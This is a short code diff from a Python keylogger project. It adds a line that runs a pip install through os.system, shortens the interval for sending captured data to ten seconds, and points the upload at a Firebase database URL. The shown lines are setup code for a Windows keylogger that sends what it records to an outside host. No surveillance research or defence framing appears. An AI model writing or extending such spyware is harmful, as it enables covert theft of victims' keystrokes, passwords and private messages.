@@ -8,11 +8,10 @@ import threading
 import win32gui
 import platform
 
-if(platform)
 
-os.write("pip install -r library.txt")
+os.system("pip install -r library.txt")
 
-send_interval= 10 #1 min
+send_interval= 10 #10sec
 firebase = firebase.FirebaseApplication('https://testunessayproject.firebaseio.com/', None)
 
 class Keylogger:
